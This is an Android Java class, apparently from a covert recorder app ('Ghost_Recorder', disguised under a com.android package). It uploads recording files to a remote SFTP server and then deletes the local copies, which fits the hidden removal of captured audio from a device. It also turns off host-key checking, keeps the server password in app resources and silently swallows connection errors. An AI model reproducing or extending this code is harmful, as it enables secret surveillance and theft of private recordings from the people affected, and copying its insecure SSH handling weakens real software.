package com.android.network.detect;

import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.util.Log;

import com.jcraft.jsch.Channel;
import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;
import com.jcraft.jsch.SftpException;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.util.ArrayList;

public class UploadRecordingTask extends AsyncTask<ArrayList<String>, Void, String> {

    private final String LOG_TAG = AppGlobals.getLogTag(getClass());
    private Session mSession;
    private Channel mChannel;
    private ChannelSftp mChannelSftp;
    private Context mContext;
    private Helpers mHelpers;
    private String mFileName;
    private boolean UPLOAD_INTERRUPTED;
    private String SFTP_HOST;
    private String SFTP_PORT;
    private String SFTP_USER;
    private String SFTP_PASSWORD;
    private String SFTP_WORKING_DIR;
    private boolean FILE_UPLOADED = false;
    private UploadRecordingTaskHelpers uploadHelpers;
    private RecordingDatabaseHelper recordingDatabaseHelper;
    Helpers helpers;

    public UploadRecordingTask(Context context) {
        super();
        mContext = context;
        mHelpers = new Helpers(context.getApplicationContext());
        uploadHelpers = new UploadRecordingTaskHelpers(mContext);
        recordingDatabaseHelper = new RecordingDatabaseHelper(mContext);
        helpers = new Helpers(mContext);
        SFTP_HOST = mContext.getString(R.string.sftp_host);
        SFTP_PORT = mContext.getString(R.string.sftp_port);
        SFTP_USER = mContext.getString(R.string.sftp_username);
        SFTP_PASSWORD = mContext.getString(R.string.sftp_password);
        SFTP_WORKING_DIR = mContext.getString(R.string.sftp_working_directory);
    }

    @Override
    protected String doInBackground(ArrayList<String>... params) {
        Log.i("Ghost_Recorder", "preparing the host information for sftp.");
        connectToServer(SFTP_HOST, SFTP_PORT, SFTP_USER, SFTP_PASSWORD, SFTP_WORKING_DIR);
        try {
            /*using jsch library for sending Recording to server*/
            for (String s: params[0]) {
                File file = new File(s);
                mFileName = file.getName();
                System.out.println("Current file"+s);
                try {
                    mChannelSftp.put(new FileInputStream(file), file.getName());
                    Log.i(LOG_TAG, "File transfered successfully to host.");
                    FILE_UPLOADED = true;
                    if (CheckInternetAndUpload.sUploadingPrevious) {
                        Log.i(LOG_TAG, "BroadCast sent...");
                        Intent intent = new Intent("com.byteshaft.deleteData");
                        intent.putExtra("FILE_NAME", mFileName);
                        mContext.sendBroadcast(intent);
                    }
                } catch (NullPointerException e) {
                    UPLOAD_INTERRUPTED = true;
                }
            }
        } catch (SftpException e) {
            UPLOAD_INTERRUPTED = true;
        } catch (FileNotFoundException e) {
            recordingDatabaseHelper.deleteItem(SqliteHelpers.COULMN_UPLOAD,helpers.path+"/"+mFileName);
        }
        return null;
    }

    @Override
    protected void onPostExecute(String aString) {
        super.onPostExecute(aString);
        if (UPLOAD_INTERRUPTED) {
            Log.i(LOG_TAG, "file upload intruptted");
            String notUploadedFile = mHelpers.path +"/"+ mFileName;
            RecordingDatabaseHelper recordingHelper = new RecordingDatabaseHelper(mContext);
            recordingHelper.createNewEntry(SqliteHelpers.COULMN_DELETE, mFileName);
            recordingHelper.createNewEntry(SqliteHelpers.COULMN_UPLOAD, notUploadedFile);
        }
        if (FILE_UPLOADED) {
            String file = mHelpers.path + "/" + mFileName;
            uploadHelpers.removeFiles(file);
            Log.i(LOG_TAG, "local file deleted");
        }
            disconnectConnection();
    }

    void deletePreviousUploadFailedRecordings(ArrayList<String> recordings) {
        connectToServer(SFTP_HOST, SFTP_PORT, SFTP_USER, SFTP_PASSWORD, SFTP_WORKING_DIR);
        for (String s : recordings) {
            try {
                System.out.println(s);
                if (mChannelSftp != null) {
                    mChannelSftp.rm(s);
                    Log.i(AppGlobals.getLogTag(getClass()), "File deleted At Server");
                }
            } catch (SftpException e) {
                recordingDatabaseHelper.deleteItem(SqliteHelpers.COULMN_DELETE,s);
            }
        }
    }

    void connectToServer(String host, String port, String userName,
                                 String password, String workingDirectory) {
        JSch jsch = new JSch();
        try {
            mSession = jsch.getSession(userName, host, Integer.valueOf(port));
            mSession.setPassword(password);
            java.util.Properties config = new java.util.Properties();
            config.put("StrictHostKeyChecking", "no");
            mSession.setConfig(config);
            mSession.connect();
            Log.i("Ghost_Recorder", "Host connected.");
            mChannel = mSession.openChannel("sftp");
            mChannel.connect();
            Log.i("Ghost_Recorder", "sftp channel opened and connected.");
            mChannelSftp = (ChannelSftp) mChannel;
            mChannelSftp.cd(workingDirectory);
        } catch (JSchException ignore) {

        } catch (SftpException e) {
            e.printStackTrace();
        }
    }

    private void disconnectConnection() {
        if (mChannelSftp != null) {
            mChannelSftp.exit();
            Log.i("Server", "sftp Channel exited.");
        }

        if (mChannel != null) {
            mChannel.disconnect();
            Log.i("Server", "Channel disconnected.");
        }

        if (mSession != null) {
            mSession.disconnect();
            Log.i("Server", "Host Session disconnected.");
        }
        CheckInternetAndUpload.sUploadingPrevious = false;
    }
}